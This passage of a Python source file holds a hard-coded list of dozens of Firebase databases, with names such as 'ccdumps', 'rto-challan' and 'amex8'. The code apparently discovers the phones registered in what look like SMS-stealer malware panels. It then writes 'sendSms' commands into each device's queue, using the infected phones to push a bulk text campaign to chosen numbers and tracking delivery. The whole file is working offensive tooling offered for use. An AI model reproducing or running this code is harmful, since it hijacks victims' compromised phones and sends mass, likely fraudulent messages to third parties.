    "https://sagar-4aaaf-default-rtdb.europe-west1.firebasedatabase.app",
    "https://vivk-9ab47-default-rtdb.firebaseio.com",
    "https://ruyu-6ae15-default-rtdb.firebaseio.com",
    "https://rahul-9fc7f-default-rtdb.firebaseio.com",
    "https://vicky-singh-20bdd-default-rtdb.firebaseio.com",
    "https://randi-a0d83-default-rtdb.firebaseio.com",
    "https://lakhan-b20e0-default-rtdb.firebaseio.com",
    "https://sonu-839e0-default-rtdb.firebaseio.com",
    "https://dilip-lore-default-rtdb.firebaseio.com",
    "https://sourav-4c188-default-rtdb.firebaseio.com",
    "https://sannn-5d617-default-rtdb.firebaseio.com",
    "https://vinod-5935e-default-rtdb.firebaseio.com",
    "https://ramkrishna-709-default-rtdb.firebaseio.com",
    "https://vshdh-ae201-default-rtdb.firebaseio.com",
    "https://babu-6d670-default-rtdb.firebaseio.com",
    "https://ck-admin-231-default-rtdb.firebaseio.com",
    "https://admin-panel-926d9-default-rtdb.firebaseio.com",
    "https://modisarkar-e84a9-default-rtdb.firebaseio.com",
    "https://ads-run-instgram-project-default-rtdb.firebaseio.com",
    "https://nidhi-70aac-default-rtdb.firebaseio.com",
    "https://dharmendra-fadc7-default-rtdb.firebaseio.com",
    "https://kingcobra01-default-rtdb.firebaseio.com",
    "https://skm2026-projet-default-rtdb.firebaseio.com",
    "https://tahirrajshg-default-rtdb.firebaseio.com",
    "https://fir-45317-default-rtdb.firebaseio.com",
    "https://fir-3e2a4-default-rtdb.firebaseio.com",
    "https://baskinath-bcd7a-default-rtdb.firebaseio.com",
    "https://good-79925-default-rtdb.firebaseio.com",
    "https://fudadmin1-default-rtdb.firebaseio.com",
    "https://hospital-22no-17augo-default-rtdb.firebaseio.com",
    "https://rto-challan-14no-8augu-default-rtdb.firebaseio.com",
    "https://pmch-34970-default-rtdb.firebaseio.com",
    "https://pm-kisan2-20361-default-rtdb.firebaseio.com",
    "https://neverleak-aba31-default-rtdb.firebaseio.com",
    "https://raju-c3c2e-default-rtdb.firebaseio.com",
    "https://gagan-6e978-default-rtdb.firebaseio.com",
    "https://online-a2823-default-rtdb.firebaseio.com",
    "https://vampi2s-default-rtdb.firebaseio.com",
    "https://white-x-43384-default-rtdb.firebaseio.com",
    "https://prince-cf8ae-default-rtdb.firebaseio.com",
    "https://rahul-cb553-default-rtdb.firebaseio.com",
    "https://ccdumps-3309d-default-rtdb.firebaseio.com",
    "https://panel-60588-default-rtdb.firebaseio.com",
    "https://aderchod-default-rtdb.firebaseio.com",
    "https://web-wala-default-rtdb.firebaseio.com",
    "https://ghostx-panel-default-rtdb.firebaseio.com",
    "https://liaroplundkitopi-default-rtdb.firebaseio.com",
    "https://rojkaro-fb2c5-default-rtdb.firebaseio.com",
    "https://ads-panel-03-38176-default-rtdb.firebaseio.com",
    "https://djejrjrjr-default-rtdb.firebaseio.com",
    "https://oppo-23600-default-rtdb.firebaseio.com",
    "https://start-95709-default-rtdb.firebaseio.com",
    "https://chut-569a0-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://proof-1eaf2-default-rtdb.firebaseio.com",
    "https://my-new-1f821-default-rtdb.firebaseio.com",
    "https://verma-ji-9ed74-default-rtdb.firebaseio.com",
    "https://raja-cha-default-rtdb.firebaseio.com",
    "https://gagan-932c5-default-rtdb.firebaseio.com",
    "https://rahul-c0c0b-default-rtdb.firebaseio.com",
    "https://easrerrr-default-rtdb.firebaseio.com",
    "https://wedding-8b6b2-default-rtdb.firebaseio.com",
    "https://customer-support-2-89e52-default-rtdb.firebaseio.com",
    "https://nunu-14cf2-default-rtdb.firebaseio.com",
    "https://amex8-d02cc-default-rtdb.firebaseio.com",
    "https://idfcs-82e4b-default-rtdb.firebaseio.com",
    "https://mamu-4db6e-default-rtdb.firebaseio.com",
    "https://pintu-3f058-default-rtdb.firebaseio.com",
    "https://uuuu-c9515-default-rtdb.firebaseio.com",
    "https://rtokinganat-default-rtdb.firebaseio.com",
    "https://shubh-befd9-default-rtdb.firebaseio.com",
]


def _load_urls() -> list[str]:
    p = _pl.Path(__file__).parent / "databases.txt"
    if p.exists():
        lines = [ln.strip() for ln in p.read_text().splitlines()
                 if ln.strip() and not ln.startswith("#")]
        if lines:
            return lines
    return _BUILTIN_URLS


RTDB_URLS: list[str] = _load_urls()

MAX_SMS_PER_DB   = 60
CONCURRENT_WRITE = 200
POLL_INTERVAL    = 8
POLL_TIMEOUT     = 300
_PER_REQUEST_TIMEOUT = 8.0   # was 15s — lowered to keep scan under 20s


@dataclass
class RtdbDevice:
    db_url: str
    device_id: str
    label: str = ""


@dataclass
class CampaignStats:
    total: int = 0
    sent: int = 0
    failed: int = 0
    pending: int = 0


async def _get(
    session: aiohttp.ClientSession,
    url: str,
    timeout: float = 8.0,
) -> Optional[dict]:
    try:
        async with session.get(
            url, timeout=aiohttp.ClientTimeout(total=timeout)
        ) as r:
            if r.status == 200:
                return await r.json(content_type=None)
    except Exception:
        pass
    return None


async def _put(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
    try:
        async with session.put(
            url, json=data, timeout=aiohttp.ClientTimeout(total=8)
        ) as r:
            return r.status in (200, 201)
    except Exception:
        return False


async def _get_devices_one(
    session: aiohttp.ClientSession,
    db_url: str,
) -> list[RtdbDevice]:
    data = await _get(
        session,
        f"{db_url}/registeredDevices.json?shallow=true",
        timeout=_PER_REQUEST_TIMEOUT,
    )
    if not data or not isinstance(data, dict):
        return []
    return [
        RtdbDevice(db_url=db_url, device_id=dev_id, label=dev_id[:12])
        for dev_id in data.keys()
    ]


async def discover_all_devices() -> list[RtdbDevice]:
    # gather with no global timeout — 8s per-request means ~20s total for 583 URLs at 300 concurrent
    connector = aiohttp.TCPConnector(limit=300, limit_per_host=10)
    async with aiohttp.ClientSession(connector=connector) as session:
        results = await asyncio.gather(
            *[_get_devices_one(session, url) for url in RTDB_URLS],
            return_exceptions=True,
        )
    devices = []
    for r in results:
        if isinstance(r, list):
            devices.extend(r)
    return devices


def _make_sms_payload(device_id: str, phone: str, text: str) -> tuple[str, dict]:
    ts = int(time.time() * 1000)
    key = str(ts)
    payload = {
        "action": {
            "command": "sendSms",
            "id": ts,
            "messageText": text,
            "phoneNumber": phone,
            "sendSms": {
                "from": 1,
                "message": text,
                "simSlot": "1",
                "to": phone,
            },
            "simSlot": "1",
            "targetDeviceId": device_id,
            "timestamp": ts,
        },
        "id": ts,
        "timestamp": ts,
    }
    return key, payload


async def dispatch_campaign(
    devices: list[RtdbDevice],
    numbers: list[str],
    text: str,
    progress_cb=None,
) -> tuple[str, list[tuple[str, str, str]]]:
    import uuid
    campaign_tag = str(uuid.uuid4())[:8]

    dev_counts: dict[tuple, int] = {}
    assignments: list[tuple[RtdbDevice, str]] = []

    for i, phone in enumerate(numbers):
        placed = False
        for attempt in range(len(devices)):
            dev = devices[(i + attempt) % len(devices)]
            key = (dev.db_url, dev.device_id)
            if dev_counts.get(key, 0) < MAX_SMS_PER_DB:
                assignments.append((dev, phone))
                dev_counts[key] = dev_counts.get(key, 0) + 1
                placed = True
                break
        if not placed:
            break

    total   = len(assignments)
    written = 0
    failed  = 0
    task_log: list[tuple[str, str, str]] = []
    sem = asyncio.Semaphore(CONCURRENT_WRITE)

    async def _write_one(dev: RtdbDevice, phone: str):
        nonlocal written, failed
        task_key, payload = _make_sms_payload(dev.device_id, phone, text)
        url = f"{dev.db_url}/sendSms/{dev.device_id}/{task_key}.json"
        async with sem:
            async with aiohttp.ClientSession() as s:
                ok = await _put(s, url, payload)
        if ok:
            written += 1
            task_log.append((dev.db_url, dev.device_id, task_key))
        else:
            failed += 1
        if progress_cb and ((written + failed) % 100 == 0 or (written + failed) == total):
            await progress_cb(written, total, failed)

    await asyncio.gather(*[_write_one(d, p) for d, p in assignments])
    return campaign_tag, task_log


async def poll_stats(
    task_log: list[tuple[str, str, str]],
    campaign_tag: str,
    update_cb=None,
):
    deadline   = time.time() + POLL_TIMEOUT
    total      = len(task_log)
    done_keys: set[str] = set()
    write_time = time.time()

    while time.time() < deadline:
        await asyncio.sleep(POLL_INTERVAL)
        elapsed = time.time() - write_time

        grand = CampaignStats(total=total)
        connector = aiohttp.TCPConnector(limit=100)
        async with aiohttp.ClientSession(connector=connector) as session:
            for db_url, device_id, task_key in task_log:
                if task_key in done_keys:
                    grand.sent += 1
                    continue

                rec = await _get(session, f"{db_url}/sendSms/{device_id}/{task_key}.json")

                if not rec or not isinstance(rec, dict):
                    if elapsed > 5:
                        grand.sent += 1
                        done_keys.add(task_key)
                    else:
                        grand.pending += 1
                    continue

                action = rec.get("action", {})
                is_sent = (
                    rec.get("isSended") is True
                    or action.get("isSended") is True
                    or str(rec.get("status", "")).lower() in ("sent", "delivered", "success")
                )
                is_failed = str(rec.get("status", "")).lower() in ("failed", "error")

                if is_sent:
                    grand.sent += 1
                    done_keys.add(task_key)
                elif is_failed:
                    grand.failed += 1
                    done_keys.add(task_key)
                else:
                    grand.pending += 1

        if update_cb:
            await update_cb(grand, [])
        if grand.pending == 0:
            break
